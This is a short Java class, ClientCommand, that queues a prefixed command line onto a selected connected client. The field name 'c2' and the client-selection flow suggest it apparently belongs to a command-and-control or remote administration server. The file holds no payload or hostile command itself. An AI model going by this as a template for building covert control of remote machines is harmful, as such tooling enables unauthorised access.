package server;

import tools.Command;
import tools.ParsedCommand;

public class ClientCommand implements Command {
	
	private CommandServer c2;
	private String prefix;
	
	public ClientCommand(CommandServer c2, String prefix) {
		this.c2 = c2;
		this.prefix = prefix;
	}

	@Override
	public String exec(ParsedCommand pCmd) {
		if (c2.getCurrentClient() >= 0) {
			ConnectedClient client;
			if ((client = c2.getClients().identify(c2.getCurrentClient()))
					!= null) {
				StringBuilder cmd = new StringBuilder();
				cmd.append(prefix + " ");
				cmd.append(pCmd.argLine());
				client.stackCmd(cmd.toString());
				return "Added command to stack";
			}
			return "No corresponding client found.";
		} else {
			return "Select a client first.";
		}
	}

}
